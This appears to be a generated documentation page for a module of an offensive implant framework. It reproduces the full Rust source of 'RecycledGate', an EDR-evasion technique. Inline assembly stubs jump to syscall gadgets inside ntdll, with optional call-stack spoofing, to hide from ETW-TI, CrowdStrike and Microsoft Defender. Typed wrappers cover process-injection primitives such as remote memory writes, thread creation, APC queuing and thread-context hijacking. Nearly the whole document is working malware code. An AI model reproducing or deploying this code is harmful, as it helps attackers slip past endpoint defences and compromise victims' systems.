# RecycledGate — OPSEC 9.5/10  (Tier S)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/sys_recycled.rs` |
| **Lines** | 699 |
| **OPSEC** | 9.5/10 |
| **Cards** | T001-recycled-gate |
| **Role** | RecycledGate inline asm stubs |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 31 |
| **Feature gates** | advanced_stack |

## Purpose

# RecycledGate — OPSEC 9.5/10  (Tier S)

## What this does

Classic "indirect syscall" emits `syscall` from the **implant's own code**
(private, unbacked memory).  ETW-TI checks the return address of every
transition to kernel mode: if RIP is not inside a known module image it
raises an alert.

RecycledGate fixes this by:

1. Walking ntdll's export table to locate the target function stub (even
when a JMP trampoline has been placed there by an EDR).
2. Scanning *within or near* that stub for the canonical bytes:
`4C 8B D1` (mov r10, rcx) + `B8 xx xx 00 00` (mov eax, SSN) + `0F 05`
(syscall) + `C3` (ret) — already done by `sys_resolve::find_syscall_stub64`.
3. Loading SSN into EAX, r10 = rcx, then **JMPing to the `syscall` gadget
byte that lives inside ntdll's own .text section**.

From the kernel's perspective:
- The call stack's return address points into ntdll.dll (backed by
`\KnownDlls\ntdll.dll`).
- The `syscall` instruction executes from an RIP that is *inside* ntdll.
- ETW-TI's stack walk finds only legitimate ntdll frames.

## Gap closed vs the existing code

`sys_resolve::find_syscall_stub64` already returns `(ssn, gadget)` where
`gadget = stub_base + 0x12` — the offset of the `SYSCALL` byte within the
original uninstrumented stub.  `sysindirect_map` stores these tuples.
`sys_indirect::invoke_syscall` reads them but then **calls
`execute_syscall_direct`** which emits `syscall` of its own via inline asm.

This module provides `recycled_invoke` which does the correct thing:
puts SSN in EAX, r10 = rcx, and **JMPs to the ntdll gadget address**.

## Integration with advanced_stack (Call Stack Spoofing)

When the `advanced_stack` feature is enabled, `recycled_spoof_invoke` wraps
the call inside `replace_and_syscall` from `advanced_stack.rs` so the
entire call stack view presented to CrowdStrike / MDE is:

```
ntdll!NtAllocateVirtualMemory+0x12  ← syscall instruction (gadget)
kernelbase!VirtualAlloc+…           ← ROP frame 1 (legit)
kernel32!VirtualAllocEx+…           ← ROP frame 2 (legit)
ntdll!RtlUserThreadStart+0x21       ← thread root frame
```

OPSEC rating: **9.5/10** (darkcrystal.html entry "RecycledGate").

## Feature gate

Enable with `--features recycled_gate`.  No extra crate deps required; all
resolver primitives already live in `sys_resolve` and `sysindirect_map`.

## Public API

### `recycled1` `unsafe` (line 86)
```rust
pub unsafe fn recycled1(ssn: u32, gadget: usize, a1: usize) -> i32
```

### `recycled2` `unsafe` (line 103)
```rust
pub unsafe fn recycled2(ssn: u32, gadget: usize, a1: usize, a2: usize) -> i32
```

### `recycled3` `unsafe` (line 121)
```rust
pub unsafe fn recycled3(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize) -> i32
```

### `recycled4` `unsafe` (line 140)
```rust
pub unsafe fn recycled4(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> i32
```

### `recycled5` `unsafe` (line 163)
```rust
pub unsafe fn recycled5(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32
```

### `recycled6` `unsafe` (line 185)
```rust
pub unsafe fn recycled6(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> i32
```

### `recycled7` `unsafe` (line 209)
```rust
pub unsafe fn recycled7(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize) -> i32
```

### `recycled8` `unsafe` (line 236)
```rust
pub unsafe fn recycled8(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize) -> i32
```

### `recycled9` `unsafe` (line 265)
```rust
pub unsafe fn recycled9(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize) -> i32
```

### `recycled10` `unsafe` (line 296)
```rust
pub unsafe fn recycled10(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize) -> i32
```

### `recycled11` `unsafe` (line 329)
```rust
pub unsafe fn recycled11(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> i32
```

### `recycled_invoke` `unsafe` (line 384)
```rust
pub unsafe fn recycled_invoke(hash: u32, arg_count: usize, args: &[usize]) -> i32
```

### `recycled_spoof_invoke` `unsafe` (line 422)
```rust
pub unsafe fn recycled_spoof_invoke(hash: u32, args: &[usize]) -> i32
```

### `nt_allocate_virtual_memory` `unsafe` (line 447)
```rust
pub unsafe fn nt_allocate_virtual_memory(
```

### `nt_write_virtual_memory` `unsafe` (line 466)
```rust
pub unsafe fn nt_write_virtual_memory(
```

### `nt_read_virtual_memory` `unsafe` (line 483)
```rust
pub unsafe fn nt_read_virtual_memory(
```

### `nt_protect_virtual_memory` `unsafe` (line 500)
```rust
pub unsafe fn nt_protect_virtual_memory(
```

### `nt_create_section` `unsafe` (line 519)
```rust
pub unsafe fn nt_create_section(
```

### `nt_map_view_of_section` `unsafe` (line 540)
```rust
pub unsafe fn nt_map_view_of_section(
```

### `nt_unmap_view_of_section` `unsafe` (line 567)
```rust
pub unsafe fn nt_unmap_view_of_section(
```

### `nt_create_thread_ex` `unsafe` (line 577)
```rust
pub unsafe fn nt_create_thread_ex(
```

### `nt_queue_apc_thread` `unsafe` (line 606)
```rust
pub unsafe fn nt_queue_apc_thread(
```

### `nt_suspend_thread` `unsafe` (line 623)
```rust
pub unsafe fn nt_suspend_thread(thread_handle: usize, previous_count: *mut u32) -> i32
```

### `nt_resume_thread` `unsafe` (line 628)
```rust
pub unsafe fn nt_resume_thread(thread_handle: usize, previous_count: *mut u32) -> i32
```

### `nt_get_context_thread` `unsafe` (line 633)
```rust
pub unsafe fn nt_get_context_thread(
```

### `nt_set_context_thread` `unsafe` (line 641)
```rust
pub unsafe fn nt_set_context_thread(
```

### `nt_open_process` `unsafe` (line 651)
```rust
pub unsafe fn nt_open_process(
```

### `nt_query_information_process` `unsafe` (line 666)
```rust
pub unsafe fn nt_query_information_process(
```

### `nt_terminate_process` `unsafe` (line 683)
```rust
pub unsafe fn nt_terminate_process(process_handle: usize, exit_status: u32) -> i32
```

### `nt_close` `unsafe` (line 690)
```rust
pub unsafe fn nt_close(handle: usize) -> i32
```

### `nt_delay_execution` `unsafe` (line 695)
```rust
pub unsafe fn nt_delay_execution(alertable: bool, interval: *const i64) -> i32
```

## Key Dependencies

- `use core::arch::asm;`
- `use super::recycled_spoof_invoke;`

## Full Source

```rust
//! # RecycledGate — OPSEC 9.5/10  (Tier S)
//!
//! ## What this does
//!
//! Classic "indirect syscall" emits `syscall` from the **implant's own code**
//! (private, unbacked memory).  ETW-TI checks the return address of every
//! transition to kernel mode: if RIP is not inside a known module image it
//! raises an alert.
//!
//! RecycledGate fixes this by:
//!
//! 1. Walking ntdll's export table to locate the target function stub (even
//!    when a JMP trampoline has been placed there by an EDR).
//! 2. Scanning *within or near* that stub for the canonical bytes:
//!    `4C 8B D1` (mov r10, rcx) + `B8 xx xx 00 00` (mov eax, SSN) + `0F 05`
//!    (syscall) + `C3` (ret) — already done by `sys_resolve::find_syscall_stub64`.
//! 3. Loading SSN into EAX, r10 = rcx, then **JMPing to the `syscall` gadget
//!    byte that lives inside ntdll's own .text section**.
//!
//! From the kernel's perspective:
//! - The call stack's return address points into ntdll.dll (backed by
//!   `\KnownDlls\ntdll.dll`).
//! - The `syscall` instruction executes from an RIP that is *inside* ntdll.
//! - ETW-TI's stack walk finds only legitimate ntdll frames.
//!
//! ## Gap closed vs the existing code
//!
//! `sys_resolve::find_syscall_stub64` already returns `(ssn, gadget)` where
//! `gadget = stub_base + 0x12` — the offset of the `SYSCALL` byte within the
//! original uninstrumented stub.  `sysindirect_map` stores these tuples.
//! `sys_indirect::invoke_syscall` reads them but then **calls
//! `execute_syscall_direct`** which emits `syscall` of its own via inline asm.
//!
//! This module provides `recycled_invoke` which does the correct thing:
//! puts SSN in EAX, r10 = rcx, and **JMPs to the ntdll gadget address**.
//!
//! ## Integration with advanced_stack (Call Stack Spoofing)
//!
//! When the `advanced_stack` feature is enabled, `recycled_spoof_invoke` wraps
//! the call inside `replace_and_syscall` from `advanced_stack.rs` so the
//! entire call stack view presented to CrowdStrike / MDE is:
//!
//! ```
//! ntdll!NtAllocateVirtualMemory+0x12  ← syscall instruction (gadget)
//! kernelbase!VirtualAlloc+…           ← ROP frame 1 (legit)
//! kernel32!VirtualAllocEx+…           ← ROP frame 2 (legit)
//! ntdll!RtlUserThreadStart+0x21       ← thread root frame
//! ```
//!
//! OPSEC rating: **9.5/10** (darkcrystal.html entry "RecycledGate").
//!
//! ## Feature gate
//!
//! Enable with `--features recycled_gate`.  No extra crate deps required; all
//! resolver primitives already live in `sys_resolve` and `sysindirect_map`.

#![allow(dead_code)]

use core::arch::asm;

// ──────────────────────────────────────────────────────────────────────────────
// Low-level JMP-to-gadget stubs (x86_64 only)
// ──────────────────────────────────────────────────────────────────────────────
//
// Each stub:
//   1. Moves the first argument (a1 / rcx) into r10.
//   2. Loads SSN into eax.
//   3. Loads the gadget address into r11.
//   4. JMPs to r11 (which is inside ntdll — `0F 05 C3`).
//
// The `syscall` instruction in ntdll sets rflag.CF and saves RIP+2 back to
// the shadow stack (if CET is on).  On return from kernel the `C3` (ret)
// inside ntdll pops the next return address from the **real** stack — which
// points back into our stub.  From there we return normally to the Rust
// caller.  The kernel's saved return-RIP (for ETW-TI) is the ntdll address.

/// Execute a 1-argument NT syscall via RecycledGate.
///
/// # Parameters
/// - `ssn`    — Service number (EAX).
/// - `gadget` — Pointer to `0F 05 C3` inside ntdll.  **Must** be a valid
///              address inside an ntdll MEM_IMAGE region.
/// - `a1`     — First syscall argument (RCX / R10).
#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled1(ssn: u32, gadget: usize, a1: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "jmp r11",
        in("rcx")  a1,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled2(ssn: u32, gadget: usize, a1: usize, a2: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "jmp r11",
        in("rcx")  a1,
        in("rdx")  a2,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled3(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "jmp r11",
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled4(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "jmp r11",
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

/// 5-argument variant.  arg5 goes to the stack slot at RSP+0x28 (shadow space
/// end / first stack arg per Microsoft ABI).  We write it *before* the JMP so
/// that the ntdll gadget stub sees it at the correct offset.
#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled5(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "jmp r11",
        a5 = in(reg) a5,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled6(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "jmp r11",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled7(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "jmp r11",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled8(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "jmp r11",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled9(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "jmp r11",
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled10(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "mov [rsp + 0x50], {a10}",
        "jmp r11",
        a5  = in(reg) a5,
        a6  = in(reg) a6,
        a7  = in(reg) a7,
        a8  = in(reg) a8,
        a9  = in(reg) a9,
        a10 = in(reg) a10,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
#[allow(clippy::too_many_arguments)]
pub unsafe fn recycled11(ssn: u32, gadget: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize, a7: usize, a8: usize, a9: usize, a10: usize, a11: usize) -> i32 {
    let ret: i32;
    asm!(
        "mov r10, rcx",
        "mov [rsp + 0x28], {a5}",
        "mov [rsp + 0x30], {a6}",
        "mov [rsp + 0x38], {a7}",
        "mov [rsp + 0x40], {a8}",
        "mov [rsp + 0x48], {a9}",
        "mov [rsp + 0x50], {a10}",
        "mov [rsp + 0x58], {a11}",
        "jmp r11",
        a5  = in(reg) a5,
        a6  = in(reg) a6,
        a7  = in(reg) a7,
        a8  = in(reg) a8,
        a9  = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        in("rcx")  a1,
        in("rdx")  a2,
        in("r8")   a3,
        in("r9")   a4,
        in("eax")  ssn,
        inlateout("r11") gadget => _,
        lateout("rax") ret,
        lateout("rcx") _,
        options(nostack),
    );
    ret
}

// ──────────────────────────────────────────────────────────────────────────────
// High-level dispatcher — mirrors the API of sys_indirect::invoke_syscall
// ──────────────────────────────────────────────────────────────────────────────

/// Dispatch a syscall using the RecycledGate technique.
///
/// Looks up `(ssn, gadget)` from the static syscall map populated by
/// `sysindirect_map`.  If not present the function returns `STATUS_INVALID_PARAMETER`
/// (`0xC000_000D` as i32 = `-1073741811`).
///
/// # Parameters
/// - `hash`      — DJB2 hash of the NT function name (e.g.
///                 `crate::compute_hash("NtAllocateVirtualMemory")`).
/// - `arg_count` — Number of valid entries in `args` (1–11).
/// - `args`      — Syscall arguments in Microsoft x64 order.  Caller is
///                 responsible for providing enough shadow space on the stack
///                 (guaranteed by the Rust ABI).
///
/// # Safety
/// All pointer arguments in `args` must be valid for the duration of the
/// syscall.  `gadget` must point into a valid, executable ntdll region.
#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled_invoke(hash: u32, arg_count: usize, args: &[usize]) -> i32 {
    let map = crate::sysindirect_map::syscall_map();
    let &(ssn, gadget) = match map.get(&hash) {
        Some(v) => v,
        None    => return -1,
    };

    // Gadget sanity: must be non-zero and point somewhere plausible.
    if gadget == 0 {
        return -1;
    }

    let a = |i: usize| -> usize { args.get(i).copied().unwrap_or(0) };

    match arg_count {
        1  => recycled1(ssn, gadget, a(0)),
        2  => recycled2(ssn, gadget, a(0), a(1)),
        3  => recycled3(ssn, gadget, a(0), a(1), a(2)),
        4  => recycled4(ssn, gadget, a(0), a(1), a(2), a(3)),
        5  => recycled5(ssn, gadget, a(0), a(1), a(2), a(3), a(4)),
        6  => recycled6(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5)),
        7  => recycled7(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6)),
        8  => recycled8(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7)),
        9  => recycled9(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8)),
        10 => recycled10(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9)),
        11 => recycled11(ssn, gadget, a(0), a(1), a(2), a(3), a(4), a(5), a(6), a(7), a(8), a(9), a(10)),
        _  => -1,
    }
}

/// Same as `recycled_invoke` but wraps the call inside Call Stack Spoofing
/// (`advanced_stack::replace_and_syscall`) when the `advanced_stack` feature
/// is active.  This is the **Tier-S invariant chain** from darkcrystal.html:
///   RecycledGate + Call Stack Spoofing → OPSEC 9.5/10
///
/// Falls back to plain `recycled_invoke` when `advanced_stack` is disabled.
#[cfg(target_arch = "x86_64")]
#[inline(always)]
pub unsafe fn recycled_spoof_invoke(hash: u32, args: &[usize]) -> i32 {
    #[cfg(feature = "advanced_stack")]
    if crate::selection_config::enable_stack_spoof() {
        // advanced_stack::replace_and_syscall already reads (ssn, gadget) from
        // the map and emits the call through the ROP-spoofed stack.
        return crate::evasion::advanced_stack::replace_and_syscall(hash, args);
    }

    // Fallback: RecycledGate without stack spoofing.
    recycled_invoke(hash, args.len(), args)
}

// ──────────────────────────────────────────────────────────────────────────────
// Typed NT wrappers — safe Rust entry points
// ──────────────────────────────────────────────────────────────────────────────
//
// These mirror the wrappers in sys_indirect::nt but dispatch through
// recycled_invoke / recycled_spoof_invoke.

pub mod nt {
    use super::recycled_spoof_invoke;
    use std::ffi::c_void;

    // ── Memory ────────────────────────────────────────────────────────────────

    pub unsafe fn nt_allocate_virtual_memory(
        process_handle: usize,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> i32 {
        let args = [
            process_handle,
            base_address as usize,
            zero_bits,
            region_size as usize,
            allocation_type as usize,
            protect as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtAllocateVirtualMemory"), &args)
    }

    pub unsafe fn nt_write_virtual_memory(
        process: usize,
        base_addr: *mut c_void,
        buffer: *const c_void,
        num_bytes: usize,
        bytes_written: *mut usize,
    ) -> i32 {
        let args = [
            process,
            base_addr as usize,
            buffer as usize,
            num_bytes,
            bytes_written as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtWriteVirtualMemory"), &args)
    }

    pub unsafe fn nt_read_virtual_memory(
        process: usize,
        base_addr: *mut c_void,
        buffer: *mut c_void,
        buffer_size: usize,
        bytes_read: *mut usize,
    ) -> i32 {
        let args = [
            process,
            base_addr as usize,
            buffer as usize,
            buffer_size,
            bytes_read as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtReadVirtualMemory"), &args)
    }

    pub unsafe fn nt_protect_virtual_memory(
        process: usize,
        base: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        let args = [
            process,
            base as usize,
            region_size as usize,
            new_protect as usize,
            old_protect as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtProtectVirtualMemory"), &args)
    }

    // ── Section / mapping ─────────────────────────────────────────────────────

    pub unsafe fn nt_create_section(
        section_handle: *mut usize,
        desired_access: u32,
        object_attributes: *mut c_void,
        maximum_size: *mut u64,
        section_page_protection: u32,
        allocation_attributes: u32,
        file_handle: usize,
    ) -> i32 {
        let args = [
            section_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            maximum_size as usize,
            section_page_protection as usize,
            allocation_attributes as usize,
            file_handle,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtCreateSection"), &args)
    }

    pub unsafe fn nt_map_view_of_section(
        section_handle: usize,
        process_handle: usize,
        base_address: *mut *mut c_void,
        zero_bits: usize,
        commit_size: usize,
        section_offset: *mut u64,
        view_size: *mut usize,
        inherit_disposition: u32,
        allocation_type: u32,
        win32_protect: u32,
    ) -> i32 {
        let args = [
            section_handle,
            process_handle,
            base_address as usize,
            zero_bits,
            commit_size,
            section_offset as usize,
            view_size as usize,
            inherit_disposition as usize,
            allocation_type as usize,
            win32_protect as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtMapViewOfSection"), &args)
    }

    pub unsafe fn nt_unmap_view_of_section(
        process_handle: usize,
        base_address: *mut c_void,
    ) -> i32 {
        let args = [process_handle, base_address as usize];
        recycled_spoof_invoke(crate::compute_hash("NtUnmapViewOfSection"), &args)
    }

    // ── Threading ─────────────────────────────────────────────────────────────

    pub unsafe fn nt_create_thread_ex(
        thread_handle: *mut usize,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: usize,
        start_routine: *const c_void,
        argument: *mut c_void,
        create_flags: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void,
    ) -> i32 {
        let args = [
            thread_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            process_handle,
            start_routine as usize,
            argument as usize,
            create_flags as usize,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtCreateThreadEx"), &args)
    }

    pub unsafe fn nt_queue_apc_thread(
        thread_handle: usize,
        apc_routine: *mut c_void,
        apc_arg1: *mut c_void,
        apc_arg2: *mut c_void,
        apc_arg3: u32,
    ) -> i32 {
        let args = [
            thread_handle,
            apc_routine as usize,
            apc_arg1 as usize,
            apc_arg2 as usize,
            apc_arg3 as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtQueueApcThread"), &args)
    }

    pub unsafe fn nt_suspend_thread(thread_handle: usize, previous_count: *mut u32) -> i32 {
        let args = [thread_handle, previous_count as usize];
        recycled_spoof_invoke(crate::compute_hash("NtSuspendThread"), &args)
    }

    pub unsafe fn nt_resume_thread(thread_handle: usize, previous_count: *mut u32) -> i32 {
        let args = [thread_handle, previous_count as usize];
        recycled_spoof_invoke(crate::compute_hash("NtResumeThread"), &args)
    }

    pub unsafe fn nt_get_context_thread(
        thread_handle: usize,
        thread_context: *mut c_void,
    ) -> i32 {
        let args = [thread_handle, thread_context as usize];
        recycled_spoof_invoke(crate::compute_hash("NtGetContextThread"), &args)
    }

    pub unsafe fn nt_set_context_thread(
        thread_handle: usize,
        thread_context: *mut c_void,
    ) -> i32 {
        let args = [thread_handle, thread_context as usize];
        recycled_spoof_invoke(crate::compute_hash("NtSetContextThread"), &args)
    }

    // ── Process ───────────────────────────────────────────────────────────────

    pub unsafe fn nt_open_process(
        process_handle: *mut usize,
        desired_access: u32,
        object_attributes: *mut c_void,
        client_id: *mut c_void,
    ) -> i32 {
        let args = [
            process_handle as usize,
            desired_access as usize,
            object_attributes as usize,
            client_id as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtOpenProcess"), &args)
    }

    pub unsafe fn nt_query_information_process(
        process: usize,
        info_class: u32,
        info: *mut u8,
        info_size: u32,
        return_length: *mut u32,
    ) -> i32 {
        let args = [
            process,
            info_class as usize,
            info as usize,
            info_size as usize,
            return_length as usize,
        ];
        recycled_spoof_invoke(crate::compute_hash("NtQueryInformationProcess"), &args)
    }

    pub unsafe fn nt_terminate_process(process_handle: usize, exit_status: u32) -> i32 {
        let args = [process_handle, exit_status as usize];
        recycled_spoof_invoke(crate::compute_hash("NtTerminateProcess"), &args)
    }

    // ── Handle / Delay ────────────────────────────────────────────────────────

    pub unsafe fn nt_close(handle: usize) -> i32 {
        let args = [handle];
        recycled_spoof_invoke(crate::compute_hash("NtClose"), &args)
    }

    pub unsafe fn nt_delay_execution(alertable: bool, interval: *const i64) -> i32 {
        let args = [alertable as usize, interval as usize];
        recycled_spoof_invoke(crate::compute_hash("NtDelayExecution"), &args)
    }
}

```